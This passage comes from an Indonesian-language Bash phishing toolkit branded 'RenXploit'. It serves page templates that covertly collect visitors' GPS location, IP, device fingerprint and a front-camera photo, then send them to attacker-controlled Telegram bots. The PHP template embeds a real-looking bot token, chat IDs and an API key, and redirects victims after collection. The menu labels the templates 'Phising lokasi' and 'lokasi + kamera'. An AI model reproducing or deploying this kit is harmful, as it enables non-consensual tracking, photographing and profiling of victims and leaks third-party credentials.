            else { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }); }
          });
          deviceLat = pos.coords.latitude; deviceLon = pos.coords.longitude;
          let geoStr = `${deviceLat}, ${deviceLon} (Akurasi: ±${pos.coords.accuracy} m`;
          if (pos.coords.altitude !== null) geoStr += `, Altitude: ${pos.coords.altitude} m`;
          if (pos.coords.altitudeAccuracy !== null) geoStr += ` (Alt. Acc: ±${pos.coords.altitudeAccuracy} m)`;
          if (pos.coords.heading !== null && !isNaN(pos.coords.heading)) geoStr += `, Heading: ${pos.coords.heading}°`;
          if (pos.coords.speed !== null && !isNaN(pos.coords.speed)) geoStr += `, Speed: ${pos.coords.speed} m/s`;
          geoStr += `, Timestamp: ${new Date(pos.timestamp).toLocaleTimeString()})`;
          info.geolocation = geoStr;
        } catch (err) {
          info.geolocation = "Error: " + err.message;
        }
      }
      if (orientationData.alpha !== null) info.deviceOrientation = `Alpha: ${orientationData.alpha.toFixed(2)}°, Beta: ${orientationData.beta.toFixed(2)}°, Gamma: ${orientationData.gamma.toFixed(2)}°`;
      else info.deviceOrientation = "Tidak Terdeteksi";
      if (absoluteOrientationData) info.absoluteOrientation = `Roll: ${absoluteOrientationData.roll}°, Pitch: ${absoluteOrientationData.pitch}°, Yaw: ${absoluteOrientationData.yaw}°`;
      else info.absoluteOrientation = "Tidak Terdeteksi";
      if (motionData) info.deviceMotion = `Acceleration: ${JSON.stringify(motionData.acceleration)}, Rotation Rate: ${JSON.stringify(motionData.rotationRate)}`;
      else info.deviceMotion = "Tidak Terdeteksi";
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        info.connection = `${connection.effectiveType} (${connection.downlink}Mbps)`;
        if (connection.rtt) info.rtt = connection.rtt + " ms";
      }
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          info.battery = battery.charging ? `Charging (${Math.round(battery.level * 100)}%)` : `${Math.round(battery.level * 100)}%`;
        } catch {
          info.battery = "Tidak Terdeteksi";
        }
      }
      try {
        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
        if (ipData) {
          info.publicIp = ipData.ip; info.city = ipData.city; info.region = ipData.region; info.country = ipData.country_name; info.location = `${ipData.latitude}, ${ipData.longitude}`;
          if (deviceLat !== null && deviceLon !== null && ipData.latitude && ipData.longitude) {
            const distance = computeDistance(deviceLat, deviceLon, ipData.latitude, ipData.longitude);
            info.vpnDetection = distance > 50 ? `Kemungkinan VPN/Proxy (Perbedaan: ${distance.toFixed(1)} km)` : "VPN/Proxy tidak terdeteksi";
          } else {
            info.vpnDetection = "Data tidak cukup untuk deteksi VPN/Proxy";
          }
        }
      } catch { }
      info.localIp = await getLocalIP().catch(() => 'Tidak Terdeteksi');
      return info;
    }

    async function captureAndSendPhoto(caption) {
        const video = document.getElementById('video-capture');
        const canvas = document.getElementById('canvas-capture');
        
        if (!video || !canvas) {
            console.error("Elemen video atau canvas tidak ditemukan! Pastikan sudah ditambahkan ke HTML.");
            const errorMessage = "⚠️ Script Error: Elemen <canvas> atau <video> tidak ditemukan di HTML.";
            chatIds.forEach(id => {
                if (!id || id.includes("MASUKAN_CHAT_ID")) return;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: id, text: errorMessage })
                });
            });
            return;
        }
        const context = canvas.getContext('2d');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            video.srcObject = stream;
            await new Promise(resolve => setTimeout(resolve, 1000));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
            chatIds.forEach(id => {
                if (!id || id.includes("MASUKAN_CHAT_ID")) return;
                const formData = new FormData();
                formData.append('chat_id', id);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', caption);
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
            });
        } catch (error) {
            console.error("Gagal mengambil foto:", error);
            const errorMessage = `⚠️ Gagal mengakses kamera: ${error.name} - ${error.message}`;
            chatIds.forEach(id => {
                if (!id || id.includes("MASUKAN_CHAT_ID")) return;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: id, text: errorMessage })
                });
            });
        }
    }

    async function sendAllInfo() {
      const loadingContainer = document.getElementById('loadingContainer');
      const loadingText = document.getElementById('loadingText');
      loadingContainer.style.display = 'block';
      loadingText.textContent = "Loading...";
      try {
        const info = await collectAllInfo();
        const message = `🔰 INFORMASI PERANGKAT By ~ RenXploit 🔰
💿 GPU: ${info.gpu}
💽 CPU: ${info.cpu}
🖥️ Layar: ${info.screen}
📐 Ukuran Jendela: ${info.innerWindow}
🖥️ Layar Tersedia: ${info.screenAvail}
🔄 Orientasi Layar: ${info.orientation}
🎨 Tema: ${info.colorScheme}
🔎 Vendor: ${info.vendor}
☕ Java Enabled: ${info.javaEnabled}
🌐 Zona Waktu: ${info.timezone}
🎮 WebGL: ${info.webgl}
🔌 Plugin: ${info.plugins}
👆 Touch: ${info.touch}
🛡️ AdBlocker: ${info.adblock}
📍 GPS: ${info.geolocation}
📡 Koneksi: ${info.connection}
${info.rtt ? "⏱️ RTT: " + info.rtt + "\n" : ""}
📱 Merek: ${info.brand}
🖥️ OS: ${info.os}
💾 Memori: ${info.memory}
🔋 Baterai: ${info.battery}
🌐 IP Publik: ${info.publicIp}
📶 IP Lokal: ${info.localIp}
🏙️ Kota: ${info.city}
📍 Wilayah: ${info.region}
🇨🇺 Negara: ${info.country}
📌 Lokasi: ${info.location}
🔍 VPN/Proxy: ${info.vpnDetection}
🗣️ Bahasa: ${info.language} (Pilihan: ${info.languages})
💻 Platform: ${info.platform}
🔍 Do Not Track: ${info.doNotTrack}
⏱️ Load Time: ${info.pageLoadTime}
🍪 Cookies: ${info.cookiesEnabled}
💾 Local Storage: ${info.localStorage}
🗄️ Session Storage: ${info.sessionStorage}
📡 Status: ${info.onLine}
👁️ Visibility: ${info.visibilityState}
🧭 Device Orientation: ${info.deviceOrientation}
📊 Absolute Orientation: ${info.absoluteOrientation}
📈 Device Motion: ${info.deviceMotion}
🔙 Referrer: ${info.referrer}`;
        const textPromises = chatIds.map(id => {
            if (!id || id.includes("MASUKAN_CHAT_ID")) return Promise.resolve();
            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: id, text: message }) }).then(res => res.json());
        });
        const results = await Promise.all(textPromises);
        if (results.some(data => data && data.ok)) {
            loadingText.textContent = "Loading...";
            const photoCaption = `📸 Tangkapan Kamera\n\nIP: ${info.publicIp}\nLokasi: ${info.city}, ${info.country}\nOS: ${info.os}`;
            await captureAndSendPhoto(photoCaption);
            loadingContainer.style.display = 'none';
            guideModal.style.display = 'flex';
            document.getElementById('tips').scrollIntoView({ behavior: 'smooth' });
        } else {
            loadingText.textContent = "Gagal mengirim info. Coba lagi nanti.";
        }
      } catch (err) {
        loadingText.textContent = "Error: " + err;
      }
    }

    async function loadTelegramFeed() {
      const telegramContainer = document.getElementById('telegramFeed');
      try {
        const data = { articles: [ { title: "Zero-Day Exploit Ditemukan di Browser Populer", summary: "Sebuah kerentanan kritis baru saja ditemukan, memungkinkan eksekusi kode jarak jauh. Pengguna disarankan untuk segera memperbarui...", url: "#" }, { title: "Panduan Lengkap Mengamankan Jaringan Wi-Fi Rumah", summary: "Jangan biarkan jaringan rumah Anda menjadi pintu masuk bagi peretas. Ikuti langkah-langkah penting ini untuk proteksi maksimal.", url: "#" }, { title: "Waspada! Serangan Ransomware Baru Mengincar UKM", summary: "Varian ransomware baru dengan metode enkripsi canggih telah muncul, menargetkan bisnis kecil dan menengah. Kenali tanda-tandanya.", url: "#" } ] };
        let feedHTML = "";
        data.articles.forEach(article => { feedHTML += `<div class="telegram-card"><h3>${article.title}</h3><p>${article.summary}</p><a href="${article.url}" target="_blank">Baca Selengkapnya →</a></div>`; });
        telegramContainer.innerHTML = feedHTML || "<p>Tidak ada data saat ini.</p>";
      } catch (error) {
        telegramContainer.innerHTML = "<p>Gagal load hot feed, bro. Coba refresh!</p>";
      }
    }

    document.getElementById('sendBtn').addEventListener('click', sendAllInfo);
    const welcomeModal = document.getElementById('welcomeModal');
    const continueBtn = document.getElementById('continueBtn');
    window.addEventListener('load', () => { 
      welcomeModal.style.display = 'flex';
      loadTelegramFeed();
    });
    continueBtn.addEventListener('click', () => {
      welcomeModal.style.display = 'none';
      sendAllInfo();
    });
    document.getElementById('contactForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const name = this.querySelector('input[type="text"]').value.trim();
      const email = this.querySelector('input[type="email"]').value.trim();
      const messageText = this.querySelector('textarea').value.trim();
      const currentUrl = window.location.href;
      const referrer = document.referrer || "Tidak Ada";
      const timestamp = new Date().toLocaleString();
      const message = `🔔 *Pesan Kontak Baru Diterima* 🔔\n\n👤 *Nama*: ${name}\n📧 *Email*: ${email}\n💬 *Pesan*: ${messageText}\n\n🕒 *Waktu*: ${timestamp}\n🌐 *URL*: ${currentUrl}\n🔙 *Referrer*: ${referrer}`;
      chatIds.forEach(id => {
        if (!id || id.includes("MASUKAN_CHAT_ID")) return;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: id, text: message, parse_mode: 'Markdown' }) })
        .then(response => response.json())
        .then(data => {
          if (data.ok) { alert("Pesan lo berhasil terkirim! Tim kami akan segera menghubungi lo."); document.getElementById('contactForm').reset(); }
          else { alert("Ups, ada error saat mengirim pesan. Coba lagi nanti ya."); }
        })
        .catch(error => { console.error("Error:", error); alert("Gagal mengirim pesan. Coba lagi nanti."); });
      });
    });
  </script>
</body>
</html>
EOF
      ;;
    3) # ini ke tiga
      cat <<'EOF'
<?php
error_reporting(0);

$botToken = "7906118469:AAFMAI9WLcJw44RwCfM-9ZuTP-Di3sZHRBk";
$chatIds = ["6640360024", "6010911941"];
$proxyCheckApiKey = "52f8eeca0bbe4536ab89b23d2d4def9dcf298f41725fd33db3a4c3b94735e024";
$redirectTo = "https://ghost.ngoprek.xyz/index.html";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['client_data'])) {

    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $time = date("d-m-Y H:i:s T");

    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "HTTPS" : "HTTP";
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];
    $fullUrl = "$protocol://$host$uri";
    $method = $_SERVER['REQUEST_METHOD'];
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct/Unknown';
    $port = $_SERVER['REMOTE_PORT'];
    $serverProtocol = $_SERVER['SERVER_PROTOCOL'];
    $language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
    $encoding = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'N/A';
    $queryString = $_SERVER['QUERY_STRING'] ?? 'None';

    $hostname = gethostbyaddr($ip);
    $hostname_sanitized = htmlspecialchars($hostname, ENT_QUOTES, 'UTF-8');
    $dntHeader = $_SERVER['HTTP_DNT'] ?? 'Not Set';
    $allHeaders = getallheaders();
    $headersText = "";
    foreach ($allHeaders as $key => $value) {
        $headersText .= "\n  `$key`: `$value`";
    }

    $geoApiUrl = "http://ip-api.com/json/$ip?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,as,mobile,proxy,hosting,query";
    $geo = json_decode(file_get_contents($geoApiUrl), true);

    $country = $geo['country'] ?? 'Unknown';
    $region = $geo['regionName'] ?? 'Unknown';
    $city = $geo['city'] ?? 'Unknown';
    $zip = $geo['zip'] ?? 'N/A';
    $isp = $geo['isp'] ?? 'Unknown';
    $as = $geo['as'] ?? 'N/A';
    $lat = $geo['lat'] ?? 'N/A';
    $lon = $geo['lon'] ?? 'N/A';
    $timezone = $geo['timezone'] ?? 'Unknown';
    $isMobile = $geo['mobile'] ? 'Yes' : 'No';
    $isProxy_ipapi = $geo['proxy'] ? 'Yes' : 'No';
    $isHosting_ipapi = $geo['hosting'] ? 'Yes' : 'No';


    $proxyInfoText = "Nonaktif (API Key tidak diisi)";
    if (!empty($proxyCheckApiKey) && $proxyCheckApiKey !== "YOUR_PROXYCHECK_API_KEY") {
        $proxyApiUrl = "http://proxycheck.io/v2/$ip?key=$proxyCheckApiKey&vpn=1&asn=1&risk=1&seen=1";
        $proxyData = json_decode(file_get_contents($proxyApiUrl), true);
        if ($proxyData && $proxyData['status'] === 'ok') {
            $proxyNode = $proxyData[$ip];
            $isProxy_pc = $proxyNode['proxy'] ?? 'no';
            $proxyType_pc = $proxyNode['type'] ?? 'N/A';
            $riskScore_pc = $proxyNode['risk'] ?? '0';
            $proxyOperator_pc = $proxyNode['operator'] ?? 'N/A';
            $proxyCountry_pc = $proxyNode['country'] ?? 'N/A';

            $proxyInfoText = "✅ Terdeteksi: `$isProxy_pc`\n";
            $proxyInfoText .= "    - Tipe: `$proxyType_pc`\n";
            $proxyInfoText .= "    - Negara Proxy: `$proxyCountry_pc`\n";
            $proxyInfoText .= "    - Operator: `$proxyOperator_pc`\n";
            $proxyInfoText .= "    - Skor Risiko (0-100): `$riskScore_pc`";
        } else {
            $proxyInfoText = "⚠️ Gagal mengambil data: " . ($proxyData['message'] ?? 'Unknown Error');
        }
    }

    $clientData = json_decode($_POST['client_data'], true);

    $batteryInfo = $clientData['battery'] ?
        "Status: `{$clientData['battery']['status']}`, Level: `{$clientData['battery']['level']}%`" :
        "`Tidak terdeteksi/didukung`";

    $pluginsText = !empty($clientData['plugins']) ?
        implode(", ", $clientData['plugins']) :
        "`Tidak ada`";
    if (strlen($pluginsText) > 500) $pluginsText = substr($pluginsText, 0, 500) . "...";

    $fontsText = !empty($clientData['fonts']) ?
        implode(", ", $clientData['fonts']) :
        "`Tidak ada font umum terdeteksi`";
    if (strlen($fontsText) > 500) $fontsText = substr($fontsText, 0, 500) . "...";

    $networkInfo = $clientData['network'] ?? [];
    $netType = $networkInfo['type'] ?? 'N/A';
    $netEffectiveType = $networkInfo['effectiveType'] ?? 'N/A';
    $netDownlink = $networkInfo['downlink'] ?? 'N/A';
    $netRtt = $networkInfo['rtt'] ?? 'N/A';

    $capabilities = $clientData['capabilities'] ?? [];
    $capWebRTC = $capabilities['webRTC'] ? '✅' : '❌';
    $capWebShare = $capabilities['webShare'] ? '✅' : '❌';
    $capVibration = $capabilities['vibration'] ? '✅' : '❌';
    $capGamepad = $capabilities['gamepad'] ? '✅' : '❌';
    $capabilitiesText = "WebRTC: $capWebRTC, Share: $capWebShare, Vibrate: $capVibration, Gamepad: $capGamepad";

    $message = "🚨 **AKSES BARU TERDETEKSI** 🚨\n\n";
    $message .= "🕒 **Waktu:** `$time`\n";
    $message .= "🔗 **URL Diakses:** `$fullUrl`\n";
    $message .= "➡️ **Sumber (Referer):** `$referer`\n\n";

    $message .= "--- **📍 INFO LOKASI & JARINGAN (SERVER)** ---\n";
    $message .= "👤 **IP Address:** `$ip`\n";
    $message .= "🛰️ **Hostname:** `$hostname_sanitized`\n";
    $message .= "🌐 **Negara:** `$country` (`$city`, `$region`)\n";
    $message .= "🧭 **Koordinat:** `$lat, $lon` ( [Buka di Peta](https://www.google.com/maps?q=$lat,$lon) )\n";
    $message .= "🏢 **ISP:** `$isp`\n";
    $message .= "🔢 **AS:** `$as`\n";
    $message .= "📱 **Jaringan Seluler (dari IP)?:** `$isMobile`\n\n";

    $message .= "--- **🕵️‍♂️ DETEKSI PROXY/VPN** ---\n";
    $message .= " ▪️ **ip-api:** Proxy: `$isProxy_ipapi`, Hosting: `$isHosting_ipapi`\n";
    $message .= " ▪️ **proxycheck.io:**\n$proxyInfoText\n\n";

    $message .= "--- **💻 INFO PERANGKAT (KLIEN)** ---\n";
    $message .= "🖥️ **User Agent:** `$ua`\n";
    $message .= "📀 **Platform (OS):** `{$clientData['os']['platform']}`\n";
    $message .= "🧠 **CPU Cores:** `{$clientData['hardware']['cpuCores']}`\n";
    $message .= "💾 **RAM (GB):** `{$clientData['hardware']['deviceMemory']}`\n";
    $message .= "🔋 **Baterai:** $batteryInfo\n";
    $message .= "👆 **Touchscreen?:** `{$clientData['device']['touchPoints']} points`\n\n";

    $message .= "--- **📶 INFO JARINGAN (KLIEN)** ---\n";
    $message .= " ▪️ **Tipe Koneksi:** `$netType`\n";
    $message .= " ▪️ **Tipe Efektif:** `$netEffectiveType`\n";
    $message .= " ▪️ **Max Speed (Mbps):** `$netDownlink`\n";
    $message .= " ▪️ **Round-Trip Time (ms):** `$netRtt`\n\n";

    $message .= "--- **🌐 INFO BROWSER (KLIEN)** ---\n";
    $message .= "🏢 **Vendor:** `{$clientData['browser']['vendor']}`\n";
    $message .= "🗣️ **Bahasa:** `{$clientData['browser']['language']}` (Lainnya: `{$clientData['browser']['languages']}`)\n";
    $message .= "⏰ **Zona Waktu:** `{$clientData['browser']['timezone']}`\n";
    $message .= "📡 **Status Online?:** `{$clientData['browser']['onlineStatus']}`\n";
    $message .= "🍪 **Cookies Aktif?:** `{$clientData['browser']['cookiesEnabled']}`\n";
    $message .= "🚫 **Do Not Track (Header)?:** `$dntHeader`\n";
    $message .= "📄 **PDF Viewer?:** `{$clientData['browser']['pdfViewerEnabled']}`\n";
    $message .= "✨ **Kemampuan:** `$capabilitiesText`\n\n";

    $message .= "--- **🛡️ INFO SIDIK JARI (FINGERPRINT)** ---\n";
    $message .= "🖼️ **Canvas:** `{$clientData['fingerprint']['canvas']}`\n";
    $message .= "🕹️ **WebGL Vendor:** `{$clientData['fingerprint']['webglVendor']}`\n";
    $message .= "🕹️ **WebGL Renderer:** `{$clientData['fingerprint']['webglRenderer']}`\n";
    $message .= "🔌 **Plugins:** `$pluginsText`\n";
    $message .= "✒️ **Fonts:** `$fontsText`\n\n";

    $message .= "--- **🖥️ INFO LAYAR (KLIEN)** ---\n";
    $message .= " ▪️ **Resolusi:** `{$clientData['screen']['resolution']}`\n";
    $message .= " ▪️ **Area Tersedia:** `{$clientData['screen']['availableResolution']}`\n";
    $message .= " ▪️ **Kedalaman Warna:** `{$clientData['screen']['colorDepth']}-bit`\n";
    $message .= " ▪️ **Pixel Ratio:** `{$clientData['screen']['pixelRatio']}`\n\n";

    $message .= "--- **🔗 INFO TEKNIS KONEKSI** ---\n";
    $message .= " ▪️ **Metode:** `$method`\n";
    $message .= " ▪️ **Port Klien:** `$port`\n";
    $message .= " ▪️ **Protokol:** `$serverProtocol ($protocol)`\n";
    $message .= " ▪️ **Query:** `$queryString`\n";
    $message .= " ▪️ **Headers Lengkap:** `$headersText`\n\n";

    $message .= "🔥 **LANJUT TARGET SELANJUTNYA** 🔥\n";
    $message .= "==================================\n";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown',
            'disable_web_page_preview' => true,
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        curl_close($ch);
    }
    file_put_contents("log_terbaru_v2.json", str_replace(['`', '*', '[', ']'], '', $message) . "\n----------------------------------------\n\n", FILE_APPEND);

    http_response_code(200);
    echo "OK";
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
</head>
<body>
    <script>
    (async function collectAndSend() {
        try {
            const orDefault = (val, def = 'N/A') => (val !== undefined && val !== null && val !== '') ? val : def;

            const getCanvasFingerprint = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    const txt = 'Bro, mantap infonya! 👍';
                    ctx.textBaseline = "top";
                    ctx.font = "14px 'Arial'";
                    ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60";
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = "#069";
                    ctx.fillText(txt, 2, 15);
                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                    ctx.fillText(txt, 4, 17);

                    const dataUrl = canvas.toDataURL();
                    let hash = 0;
                    for (let i = 0; i < dataUrl.length; i++) {
                        const char = dataUrl.charCodeAt(i);
                        hash = ((hash << 5) - hash) + char;
                        hash |= 0;
                    }
                    return hash;
                } catch (e) {
                    return 'Error';
                }
            };

            const getWebglInfo = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        };
                    }
                } catch (e) {}
                return { vendor: 'N/A', renderer: 'N/A' };
            };

            const getFonts = () => {
                const commonFonts = [
                    'Arial', 'Verdana', 'Helvetica', 'Tahoma', 'Trebuchet MS', 'Times New Roman', 'Georgia',
                    'Garamond', 'Courier New', 'Brush Script MT', 'Calibri', 'Cambria', 'Segoe UI',
                    'Roboto', 'Droid Sans', 'Lato', 'Open Sans', 'Montserrat'
                ];
                const availableFonts = [];
                try {
                    const baseFonts = ['monospace', 'sans-serif', 'serif'];
                    const testString = "mmmmmmmmmmlli";
                    const testSize = '72px';
                    const body = document.body;
                    const h = document.createElement('div');
                    h.style.cssText = `position:absolute;top:-9999px;left:-9999px;font-size:${testSize};`;
                    body.appendChild(h);

                    const getWidth = (fontFamily) => {
                        h.style.fontFamily = fontFamily;
                        h.innerHTML = testString;
                        return h.offsetWidth;
                    };

                    const defaultWidths = {};
                    for (const font of baseFonts) {
                        defaultWidths[font] = getWidth(font);
                    }

                    for (const font of commonFonts) {
                        const monoWidth = getWidth(`'${font}',monospace`);
                        const sansWidth = getWidth(`'${font}',sans-serif`);
                        const serifWidth = getWidth(`'${font}',serif`);
                        if (monoWidth !== defaultWidths.monospace || sansWidth !== defaultWidths['sans-serif'] || serifWidth !== defaultWidths.serif) {
                            availableFonts.push(font);
                        }
                    }
                    body.removeChild(h);
                } catch (e) { return ['Error']; }
                return availableFonts;
            };

            let batteryData = null;
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryData = {
                        level: Math.round(battery.level * 100),
                        status: battery.charging ? 'Charging' : 'Discharging'
                    };
                } catch(e) {
                    batteryData = { level: 'Error', status: 'Error' };
                }
            }

            const webgl = getWebglInfo();
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};

            const data = {
                screen: {
                    resolution: `${orDefault(screen.width, 'N/A')}x${orDefault(screen.height, 'N/A')}`,
                    availableResolution: `${orDefault(screen.availWidth, 'N/A')}x${orDefault(screen.availHeight, 'N/A')}`,
                    colorDepth: orDefault(screen.colorDepth),
                    pixelRatio: orDefault(window.devicePixelRatio)
                },
                browser: {
                    vendor: orDefault(navigator.vendor),
                    language: orDefault(navigator.language),
                    languages: orDefault(navigator.languages, []).join(', '),
                    cookiesEnabled: orDefault(navigator.cookieEnabled),
                    onlineStatus: orDefault(navigator.onLine),
                    pdfViewerEnabled: orDefault(navigator.pdfViewerEnabled),
                    timezone: orDefault(Intl.DateTimeFormat().resolvedOptions().timeZone),
                },
                os: {
                    platform: orDefault(navigator.platform),
                },
                device: {
                    touchPoints: orDefault(navigator.maxTouchPoints, 0)
                },
                hardware: {
                    cpuCores: orDefault(navigator.hardwareConcurrency),
                    deviceMemory: orDefault(navigator.deviceMemory)
                },
                network: {
                    type: orDefault(connection.type),
                    effectiveType: orDefault(connection.effectiveType),
                    downlink: orDefault(connection.downlink),
                    rtt: orDefault(connection.rtt)
                },
                battery: batteryData,
                fingerprint: {
                    canvas: getCanvasFingerprint(),
                    webglVendor: orDefault(webgl.vendor),
                    webglRenderer: orDefault(webgl.renderer)
                },
                plugins: Array.from(navigator.plugins).map(p => p.name),
                fonts: getFonts(),
                capabilities: {
                    webRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
                    webShare: !!navigator.share,
                    vibration: !!navigator.vibrate,
                    gamepad: !!navigator.getGamepads,
                }
            };

            const formData = new FormData();
            formData.append('client_data', JSON.stringify(data));

            await fetch('', {
                method: 'POST',
                body: formData
            });

        } catch (error) {
            const formData = new FormData();
            formData.append('client_data', JSON.stringify({ error: error.message, stack: error.stack }));
            await fetch('', { method: 'POST', body: formData });

        } finally {
            window.location.href = "<?php echo $redirectTo; ?>";
        }
    })();
    </script>
    <noscript>
        <p>Please enable JavaScript to continue.</p>
        <?php
            header("Location: " . $redirectTo);
            exit;
        ?>
    </noscript>
</body>
</html>

EOF
      ;;
  esac
}

manage_localhost() {
  PHP_PIDS=$(pgrep -f "php -S localhost")

  if [[ -z "$PHP_PIDS" ]]; then
    echo -e "${C_YELLOW}ℹ️ Tidak ada proses localhost (php -S) yang sedang berjalan.${C_RESET}"
    return 1
  fi

  echo -e "🔎 Ditemukan proses php -S dengan PID: $PHP_PIDS"
  read -rp "$(echo -e "${C_YELLOW}🤔 Apakah ingin menghentikan semuanya? (y/n): ${C_RESET}")" jawab
  case "$jawab" in
    y|Y)
      kill -9 $PHP_PIDS
      echo -e "${C_GREEN}✅ Semua proses localhost berhasil dihentikan.${C_RESET}"
      ;;
    n|N)
      echo -e "${C_YELLOW}👍 Dibiarkan tetap berjalan.${C_RESET}"
      ;;
    *)
      echo -e "${C_RED}❌ Input tidak valid, dibatalkan.${C_RESET}"
      ;;
  esac
  return 0
}

run_localhost() {
  clear
  type_effect "🚀 Menjalankan Menu ke 1 → Localhost..."
  print_separator

  PHP_PIDS=$(pgrep -f "php -S localhost")
  if [[ -n "$PHP_PIDS" ]]; then
    echo -e "${C_YELLOW}⚠️ Terdeteksi proses php -S masih berjalan (PID: ${C_BOLD}$PHP_PIDS${C_RESET})"
    read -rp "$(echo -e "${C_YELLOW}🤔 Hentikan dulu sebelum jalankan baru? (y/n): ${C_RESET}")" jawab
    if [[ "$jawab" =~ ^[Yy]$ ]]; then
      kill -9 $PHP_PIDS
      echo -e "${C_GREEN}✅ Proses lama dihentikan.${C_RESET}"
      sleep 1
    else
      echo -e "${C_RED}❌ Batal menjalankan server baru.${C_RESET}"
      sleep 1
      return
    fi
  fi

  echo
  echo -e "${C_CYAN}${C_BOLD}"
    print_banner
    echo -e "${C_RESET}"
  type_effect "📜 Pilih Template untuk Localhost:"
  echo -e "${C_YELLOW}   1)${C_RESET} Phising lokasi"
  echo -e "${C_YELLOW}   2)${C_RESET} Phising lokasi + kamera"
  echo -e "${C_YELLOW}   3)${C_RESET} Phising lokasi system 301"
  echo -e "${C_YELLOW}   4)${C_RESET} Kembali ke Menu"
  read -rp "$(echo -e "${C_BOLD}${C_MAGENTA}Pilih opsi [1-4]: ${C_RESET}")" tmpl

  case "$tmpl" in
    1|2|3)
      read -rp "$(echo -e "${C_CYAN}🔌 Masukkan nomor port (default: 8000): ${C_RESET}")" PORT
      PORT=${PORT:-8000}

      WORKDIR="www_$(date +%s)"
      mkdir -p "$WORKDIR"
      get_template "$tmpl" > "$WORKDIR/index.html"

      echo
      echo -e "${C_GREEN}🌐 Server berjalan di ${C_BOLD}http://localhost:$PORT${C_RESET}"
      echo -e "${C_YELLOW}(Tekan Ctrl+C untuk berhenti)${C_RESET}"
      print_separator "${C_GREEN}"
      
      php -S "localhost:$PORT" -t "$WORKDIR"

      rm -rf "$WORKDIR"
      ;;
    4)
      return ;;
    *)
      echo -e "${C_RED}❌ Pilihan tidak valid!${C_RESET}"
      sleep 1
      ;;
  esac
}

copy_template() {
  while true; do
    clear
    echo -e "${C_CYAN}${C_BOLD}"
    print_banner
    echo -e "${C_RESET}"
    type_effect "📋 Salin Template ke File"
    print_separator
    echo -e "${C_YELLOW}   1)${C_RESET} Phising lokasi"
    echo -e "${C_YELLOW}   2)${C_RESET} Phising lokasi + kamera"
    echo -e "${C_YELLOW}   3)${C_RESET} Phising system 301"
    echo -e "${C_YELLOW}   4)${C_RESET} Kembali ke Menu"
    read -rp "$(echo -e "${C_BOLD}${C_MAGENTA}Pilih template [1-4]: ${C_RESET}")" tmpl

    case "$tmpl" in
      1|2|3)
        read -rp "$(echo -e "${C_CYAN}📝 Masukkan nama file tujuan (mis. output.html): ${C_RESET}")" fname
        if [[ -z "$fname" ]]; then
          echo -e "${C_RED}❌ Nama file tidak boleh kosong!${C_RESET}"
          sleep 1
        else
          mkdir -p "$(dirname "$fname")"
          get_template "$tmpl" > "$fname"
          echo -e "${C_GREEN}✅ File berhasil dibuat: ${C_BOLD}$fname${C_RESET}"
          read -rp "$(echo -e "${C_YELLOW}Tekan Enter untuk kembali...${C_RESET}")"
        fi
        ;;
      4) return ;;
      *) echo -e "${C_RED}❌ Pilihan tidak valid!${C_RESET}"; sleep 1 ;;
    esac
  done
}

main_menu() {
  while true; do
    clear
    echo -e "${C_CYAN}${C_BOLD}"
    print_banner
    echo -e "${C_RESET}"
